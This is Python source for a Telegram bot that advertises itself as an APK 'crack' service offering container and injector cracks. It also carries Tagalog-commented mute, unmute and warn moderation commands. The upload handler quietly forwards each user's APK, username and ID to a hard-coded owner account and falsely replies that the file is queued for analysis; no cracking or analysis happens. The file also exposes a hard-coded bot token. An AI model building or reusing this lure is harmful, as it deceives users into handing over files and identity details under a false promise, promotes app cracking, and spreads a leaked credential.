from telegram import ChatPermissions, Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

BOT_TOKEN = "8977241712:AAEYXkHjAOuDXLDSiyTYPxHPAdyTXqpfzaM"
OWNER_ID = 6763595343

# Dictionary para sa pag-track ng warnings ng mga user sa GC
warn_database = {}


# Helper function para masigurong admin o owner lang ang gagamit ng mod commands
async def is_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    if user_id == OWNER_ID:
        return True
    if update.effective_chat.type == "private":
        return False
    member = await context.bot.get_chat_member(
        chat_id=update.effective_chat.id, user_id=user_id
    )
    return member.status in ["administrator", "creator"]


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    text = f"""
Hello {update.effective_user.first_name} 👋

Welcome to APK ShadowCode Bot.

Send your APK file here for:

\===CRACK===/
• CONTAINER
• INJECTOR

Upload your APK now to begin crack.
"""

    await update.message.reply_text(text)


async def apk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):

    message = update.message

    if not message or not message.document:
        return

    document = message.document

    # APK only
    if document.file_name and document.file_name.lower().endswith(".apk"):

        # Forward APK to owner
        await context.bot.send_document(
            chat_id=OWNER_ID,
            document=document.file_id,
            caption=(
                f"📦 New APK Received\n\n"
                f"👤 User: @{message.from_user.username or message.from_user.first_name}\n"
                f"🆔 ID: {message.from_user.id}\n"
                f"📁 File: {document.file_name}"
            )
        )

        await message.reply_text(
            "✅ APK uploaded successfully.\n"
            "Your file has been queued for analysis."
        )

    else:
        await message.reply_text(
            "❌ Only APK files are allowed."
        )


# --- MODERATION COMMANDS (ROSE STYLE) ---


async def mute_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context):
        return

    if not update.message.reply_to_message:
        await update.message.reply_text("❌ I-reply mo ang command na ito sa message ng user na gusto mong i-mute.")
        return

    target_user = update.message.reply_to_message.from_user
    chat_id = update.effective_chat.id

    no_permissions = ChatPermissions(
        can_send_messages=False,
        can_send_audios=False,
        can_send_documents=False,
        can_send_photos=False,
        can_send_videos=False,
        can_send_video_notes=False,
        can_send_voice_notes=False,
        can_send_polls=False,
        can_send_other_messages=False,
        can_add_web_page_previews=False,
    )

    try:
        await context.bot.restrict_chat_member(
            chat_id=chat_id, user_id=target_user.id, permissions=no_permissions
        )
        await update.message.reply_text(f"🤐 Natahimik si **{target_user.first_name}** (Muted).")
    except Exception as e:
        await update.message.reply_text(f"❌ Error sa pag-mute: {e}")


async def unmute_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context):
        return

    if not update.message.reply_to_message:
        await update.message.reply_text("❌ I-reply mo ang command na ito sa message ng user na gusto mong i-unmute.")
        return

    target_user = update.message.reply_to_message.from_user
    chat_id = update.effective_chat.id

    full_permissions = ChatPermissions(
        can_send_messages=True,
        can_send_audios=True,
        can_send_documents=True,
        can_send_photos=True,
        can_send_videos=True,
        can_send_video_notes=True,
        can_send_voice_notes=True,
        can_send_polls=True,
        can_send_other_messages=True,
        can_add_web_page_previews=True,
    )

    try:
        await context.bot.restrict_chat_member(
            chat_id=chat_id, user_id=target_user.id, permissions=full_permissions
        )
        await update.message.reply_text(f"🔊 Pwede na ulit mag-ingay si **{target_user.first_name}** (Unmuted).")
    except Exception as e:
        await update.message.reply_text(f"❌ Error sa pag-unmute: {e}")


async def warn_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context):
        return

    if not update.message.reply_to_message:
        await update.message.reply_text("❌ I-reply mo ang command na ito sa message ng user na gusto mong i-warn.")
        return

    target_user = update.message.reply_to_message.from_user
    chat_id = update.effective_chat.id
    user_id = target_user.id

    warn_database[user_id] = warn_database.get(user_id, 0) + 1
    current_warns = warn_database[user_id]

    if current_warns >= 3:
        no_permissions = ChatPermissions(can_send_messages=False)
        try:
            await context.bot.restrict_chat_member(
                chat_id=chat_id, user_id=user_id, permissions=no_permissions
            )
            await update.message.reply_text(
                f"🚨 **{target_user.first_name}** ay nakakuha ng {current_warns}/3 warnings. Automatic **MUTED**!"
            )
            warn_database[user_id] = 0
        except Exception as e:
            await update.message.reply_text(f"❌ Hindi ma-mute ang user: {e}")
    else:
        await update.message.reply_text(
            f"⚠️ Warning {current_warns}/3 para kay **{target_user.first_name}**. Ayusin mo galaw mo!"
        )


app = Application.builder().token(BOT_TOKEN).build()

# Commands
app.add_handler(CommandHandler("start", start))

# Moderation Commands
app.add_handler(CommandHandler("mute", mute_user))
app.add_handler(CommandHandler("unmute", unmute_user))
app.add_handler(CommandHandler("warn", warn_user))

# APK handler
app.add_handler(MessageHandler(filters.Document.ALL, apk_handler))

print("Bot running...")
app.run_polling()
